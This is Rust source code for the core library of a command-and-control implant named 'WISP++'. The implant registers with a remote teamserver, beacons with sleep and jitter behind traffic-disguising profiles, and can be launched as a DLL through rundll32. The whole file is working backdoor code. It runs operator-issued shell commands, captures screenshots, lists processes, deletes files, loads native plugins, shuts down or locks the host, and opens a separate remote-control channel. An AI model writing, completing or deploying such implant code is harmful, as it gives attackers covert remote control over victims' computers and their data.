// WISP++ Rust implant library: Type1 register/checkin/result, malleable
// profiles, sentinel-embedded config and on-demand Type2 RCP. Wire-compatible
// with the Go teamserver (shared/protocol). The `wisp-agent-rs` binary is a
// thin wrapper; the staged `wisp-core` cdylib reuses this crate directly.
pub mod commands;
pub mod compress;
pub mod config;
pub mod crypto;
pub mod envelope;
#[cfg(windows)]
pub mod native_plugin;
pub mod profile;
#[cfg(feature = "quic")]
pub mod quic;
pub mod pty;
pub mod rcp;
pub mod sysinfo;
pub mod transport;

use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use base64::Engine;
use serde_json::Value;

use crate::config::Config;
use crate::crypto::{psk_proof, wrap_session_key, SessionKey};
use crate::envelope::{
    heartbeat, Envelope, RegisterAck, RegisterInfo, Task, TaskResult, CMD_CLIENT_KILL, CMD_EXIT,
    CMD_HOST_LOCK, CMD_HOST_LOGOFF, CMD_HOST_REBOOT, CMD_HOST_SHUTDOWN, CMD_LS_JSON, CMD_MKDIR,
    CMD_PLUGIN_LOAD, CMD_PS, CMD_PWD, CMD_RCP_CONNECT, CMD_RCP_DISCONNECT, CMD_REKEY, CMD_RM,
    CMD_SCREENSHOT, CMD_SHELL, CMD_SLEEP, CMD_SYSINFO, MSG_CHECKIN, MSG_REGISTER, MSG_RESULT,
};
use crate::rcp::RcpCtl;
use crate::transport::Transport;

struct Agent {
    id: String,
    cfg: Config,
    tr: Transport,
    sk: SessionKey,
    rcp: Arc<RcpCtl>,
    rcp_addr: String,
    rcp_token: String,
    extra_caps: Vec<String>,
    // zstd mirrors profile.zstd for envelope compression (plan P6); the
    // profile itself is owned by Transport.
    zstd: bool,
}

impl Agent {
    // mark_cap records a capability discovered at runtime (e.g. after a
    // native plugin load); the next registration advertises it. Windows-only:
    // the native plugin host is the sole caller.
    #[cfg(windows)]
    fn mark_cap(&mut self, cap: &str) {
        if !self.extra_caps.iter().any(|c| c == cap) {
            self.extra_caps.push(cap.to_string());
        }
    }
}

enum RegError {
    Transport(String),
    Rejected(String),
}

// Keeps the compile-time sentinel slot in the standalone binary's image. The
// core cdylib builds without the `embedded-slot` feature and this is a no-op.
#[cfg(feature = "embedded-slot")]
pub fn keep_slot_alive() {
    let _ = config::anchor();
}

#[cfg(not(feature = "embedded-slot"))]
pub fn keep_slot_alive() {}

// Rundll32 entry points for the cdylib build. The patched slot lives in the
// DLL's .data section, so no arguments are needed:
//
//   rundll32.exe agent.dll,WispStart
#[cfg(all(windows, feature = "embedded-slot"))]
mod dll_export {
    use std::ffi::{c_char, c_void};

    use crate::config;

    fn start() -> i32 {
        match config::load_for_agent() {
            Ok(cfg) => {
                crate::run(cfg);
                0
            }
            Err(e) => {
                eprintln!("agent: dll: {e}");
                1
            }
        }
    }

    #[no_mangle]
    pub extern "system" fn WispStart(
        _hwnd: *mut c_void,
        _hinst: *mut c_void,
        _cmd: *mut c_char,
        _show: i32,
    ) -> i32 {
        start()
    }

    #[no_mangle]
    pub extern "system" fn WispStartEx(
        _hwnd: *mut c_void,
        _hinst: *mut c_void,
        _cmd: *mut c_char,
        _show: i32,
    ) -> i32 {
        start()
    }
}

// Runs the agent until the operator kills the session. Returns only on an
// orderly exit (CMD_EXIT/CMD_CLIENT_KILL); fatal misconfiguration exits the
// process directly, matching the teamserver's offline-on-ack semantics.
pub fn run(cfg: Config) {
    let id = new_agent_id();
    let profile = cfg.profile.clone().unwrap_or_else(profile::Profile::generic);
    let zstd = profile.zstd;
    let tr = match Transport::new(&cfg.servers, profile, cfg.insecure) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("agent: {e}");
            std::process::exit(1);
        }
    };
    let rcp = RcpCtl::new(&id);
    eprintln!(
        "agent: {id} starting ({} server(s), sleep {}ms jitter {}%)",
        cfg.servers.len(),
        cfg.sleep_ms,
        cfg.jitter_pct
    );

    let (sk, ack) = register_loop(&tr, &cfg, &id, &[]);
    let mut a = Agent {
        id,
        cfg,
        tr,
        sk,
        rcp,
        rcp_addr: String::new(),
        rcp_token: String::new(),
        extra_caps: Vec::new(),
        zstd,
    };
    apply_ack(&mut a, &ack);
    log_registered(&a);

    let start = Instant::now();
    let mut seq = 0u64;
    let mut fails = 0u32;
    loop {
        seq += 1;
        match checkin(&a.tr, &a.sk, &a.id, seq, start.elapsed(), a.zstd) {
            Ok(task) => {
                fails = 0;
                if let Some(task) = task {
                    if run_task(&mut a, task) {
                        eprintln!("agent: exiting on operator command");
                        return;
                    }
                }
            }
            Err(e) => {
                let camo = transport::is_camo_404(&e);
                if camo {
                    fails = 0; // server says the session is gone outright
                } else {
                    fails += 1;
                    eprintln!("agent: checkin failed ({fails}): {e}");
                }
                if camo || fails >= 3 {
                    fails = 0;
                    re_register(&mut a);
                }
            }
        }
        std::thread::sleep(Duration::from_millis(a.cfg.effective_sleep()));
    }
}

fn new_agent_id() -> String {
    use rand::RngCore;
    let mut b = [0u8; 8];
    rand::thread_rng().fill_bytes(&mut b);
    hex::encode(b)
}

fn register_loop(tr: &Transport, cfg: &Config, id: &str, extra_caps: &[String]) -> (SessionKey, RegisterAck) {
    loop {
        match register_once(tr, cfg, id, extra_caps) {
            Ok(v) => return v,
            Err(RegError::Rejected(reason)) => {
                eprintln!("agent: register rejected by server: {reason}");
                std::process::exit(2);
            }
            Err(RegError::Transport(e)) => {
                eprintln!("agent: register failed: {e} (retrying in 5s)");
                std::thread::sleep(Duration::from_secs(5));
            }
        }
    }
}

fn register_once(
    tr: &Transport,
    cfg: &Config,
    id: &str,
    extra_caps: &[String],
) -> Result<(SessionKey, RegisterAck), RegError> {
    let pub_key = tr.pubkey().map_err(RegError::Transport)?;
    let sk = SessionKey::random();
    let wrapped = wrap_session_key(&pub_key, &sk).map_err(RegError::Transport)?;
    let mut caps: Vec<String> = vec!["rcp".into(), "view".into(), "file".into()];
    for c in extra_caps {
        if !caps.iter().any(|x| x == c) {
            caps.push(c.clone());
        }
    }
    // P6 replay protection: fresh ts+nonce per registration.
    let nonce = {
        use rand::RngCore;
        let mut b = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut b);
        hex::encode(b)
    };
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let info = RegisterInfo {
        agent: id.to_string(),
        system: sysinfo::collect(),
        wk: envelope::b64().encode(wrapped),
        psk: envelope::b64().encode(psk_proof(&cfg.psk, id, &sk.id)),
        caps,
        ts: now,
        nonce,
        proto: envelope::V,
    };
    let data = serde_json::to_value(info).map_err(|e| RegError::Transport(e.to_string()))?;
    let resp = tr
        .send(&Envelope::plain(MSG_REGISTER, id, data))
        .map_err(RegError::Transport)?;
    let ack: RegisterAck = serde_json::from_value(resp.d.unwrap_or(Value::Null))
        .map_err(|e| RegError::Transport(format!("register ack: {e}")))?;
    if !ack.ok {
        let reason = if ack.reason.is_empty() {
            "no reason given".to_string()
        } else {
            ack.reason
        };
        return Err(RegError::Rejected(reason));
    }
    Ok((sk, ack))
}

fn apply_ack(a: &mut Agent, ack: &RegisterAck) {
    if ack.sleep_ms > 0 {
        a.cfg.sleep_ms = ack.sleep_ms;
        a.cfg.jitter_pct = ack.jitter_pct;
    }
    a.rcp_addr = ack.rcp_addr.clone();
    a.rcp_token = ack.rcp_token.clone();
    a.rcp.set_credentials(&a.rcp_addr, &a.rcp_token);
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    if ack.server_now > 0 && (now - ack.server_now).abs() > 60 {
        eprintln!("agent: clock drift {:+}s vs server", now - ack.server_now);
    }
}

fn log_registered(a: &Agent) {
    if a.rcp_addr.is_empty() {
        eprintln!("agent: {} registered (no Type2 endpoint advertised)", a.id);
    } else {
        eprintln!(
            "agent: {} registered (Type2 on demand at {})",
            a.id, a.rcp_addr
        );
    }
}

fn re_register(a: &mut Agent) {
    let wanted = a.rcp.wanted();
    a.rcp.stop();
    eprintln!("agent: session lost, re-registering");
    let (sk, ack) = register_loop(&a.tr, &a.cfg, &a.id, &a.extra_caps);
    a.sk = sk;
    apply_ack(a, &ack);
    eprintln!("agent: {} re-registered", a.id);
    if wanted && !a.rcp_addr.is_empty() {
        a.rcp.reconnect();
    }
}

// rotate_session issues a fresh session key with the server (plan P6 rekey).
// The RCP channel rides its own PSK-bound credential, so Type2 survives.
fn rotate_session(a: &mut Agent) -> Result<String, String> {
    match register_once(&a.tr, &a.cfg, &a.id, &a.extra_caps) {
        Ok((sk, ack)) => {
            a.sk = sk;
            apply_ack(a, &ack);
            Ok(format!("rekeyed session key {}…", hex::encode(&a.sk.id[..4])))
        }
        Err(RegError::Transport(s)) | Err(RegError::Rejected(s)) => Err(s),
    }
}

fn checkin(
    tr: &Transport,
    sk: &SessionKey,
    agent: &str,
    seq: u64,
    uptime: Duration,
    zstd: bool,
) -> Result<Option<Task>, String> {
    let env = Envelope::sealed_zstd(
        MSG_CHECKIN,
        agent,
        sk,
        &heartbeat(seq, uptime.as_millis() as i64),
        zstd,
    );
    let resp = tr.send(&env)?;
    let Some(data) = resp.d.as_ref() else {
        return Ok(None);
    };
    if data.is_null() {
        return Ok(None);
    }
    let opened = resp
        .open_sealed(sk)
        .ok_or_else(|| "checkin: sealed response did not open".to_string())?;
    if opened.is_null() {
        return Ok(None);
    }
    let task: Task = serde_json::from_value(opened).map_err(|e| format!("task: {e}"))?;
    if task.id.is_empty() {
        return Ok(None);
    }
    Ok(Some(task))
}

fn post_result(a: &Agent, res: TaskResult) {
    let Ok(data) = serde_json::to_value(res) else {
        return;
    };
    let env = Envelope::sealed_zstd(MSG_RESULT, &a.id, &a.sk, &data, a.zstd);
    if let Err(e) = a.tr.send(&env) {
        eprintln!("agent: post result: {e}");
    }
}

// Returns true when the agent should stop.
fn run_task(a: &mut Agent, task: Task) -> bool {
    let id = task.id.clone();
    if task.cmd == CMD_EXIT || task.cmd == CMD_CLIENT_KILL {
        // Post sync: the server marks the session offline on this ack.
        post_result(a, commands::with_id(commands::ok(""), &id));
        return true;
    }
    let res = dispatch(a, task.cmd, &task.args);
    post_result(a, commands::with_id(res, &id));
    false
}

fn dispatch(a: &mut Agent, cmd: u32, args: &Value) -> TaskResult {
    match cmd {
        CMD_SHELL => {
            let command = args.get("command").and_then(Value::as_str).unwrap_or("");
            let timeout = args.get("timeout_ms").and_then(Value::as_i64).unwrap_or(0);
            let out = commands::run_shell(command, timeout);
            let mut res = match out.err {
                Some(e) if out.output.is_empty() => commands::fail(e),
                _ => commands::ok(out.output),
            };
            res.exit = out.exit;
            res
        }
        CMD_SYSINFO => match serde_json::to_string(&sysinfo::collect()) {
            Ok(s) => commands::ok(s),
            Err(e) => commands::fail(e.to_string()),
        },
        CMD_PWD => commands::cmd_pwd(),
        CMD_LS_JSON => commands::cmd_ls(args),
        CMD_MKDIR => commands::cmd_mkdir(args),
        CMD_RM => commands::cmd_rm(args),
        CMD_SCREENSHOT => commands::cmd_screenshot(),
        CMD_PS => commands::cmd_ps(),
        CMD_REKEY => match rotate_session(a) {
            Ok(out) => {
                eprintln!("agent: session key rotated on operator request");
                commands::ok(out)
            }
            Err(e) => commands::fail(format!("rekey: {e}")),
        },
        #[cfg(windows)]
        CMD_PLUGIN_LOAD => match native_plugin::load(a, args) {
            Ok(out) => {
                a.mark_cap("plugin-native");
                eprintln!("agent: native plugin loaded, re-registering with new caps");
                re_register(a);
                commands::ok(out)
            }
            Err(e) => commands::fail(format!("plugin: {e}")),
        },
        #[cfg(not(windows))]
        CMD_PLUGIN_LOAD => commands::fail("native plugins are windows-only"),
        CMD_HOST_REBOOT | CMD_HOST_SHUTDOWN | CMD_HOST_LOGOFF | CMD_HOST_LOCK => {
            commands::cmd_host(cmd)
        }
        CMD_SLEEP => {
            let sleep = args
                .get("sleep_ms")
                .and_then(Value::as_i64)
                .unwrap_or(a.cfg.sleep_ms);
            let jitter = args
                .get("jitter_pct")
                .and_then(Value::as_i64)
                .unwrap_or(a.cfg.jitter_pct);
            if sleep >= 10 {
                a.cfg.sleep_ms = sleep;
            }
            if (0..=100).contains(&jitter) {
                a.cfg.jitter_pct = jitter;
            }
            commands::ok(format!(
                "sleep={}ms jitter={}%",
                a.cfg.sleep_ms, a.cfg.jitter_pct
            ))
        }
        CMD_RCP_CONNECT => {
            let addr = args.get("addr").and_then(Value::as_str).unwrap_or("");
            let token = args.get("token").and_then(Value::as_str).unwrap_or("");
            let (addr, token) = if addr.is_empty() {
                (a.rcp_addr.clone(), a.rcp_token.clone())
            } else {
                (addr.to_string(), token.to_string())
            };
            if addr.is_empty() {
                return commands::fail("no Type2 address known (create an rcp listener)");
            }
            a.rcp.start(&addr, &token);
            a.rcp_addr = addr.clone();
            a.rcp_token = token;
            commands::ok(format!("dialing {addr}"))
        }
        CMD_RCP_DISCONNECT => {
            a.rcp.stop();
            commands::ok("type2 down")
        }
        other => commands::fail(format!("cmd {other} not implemented")),
    }
}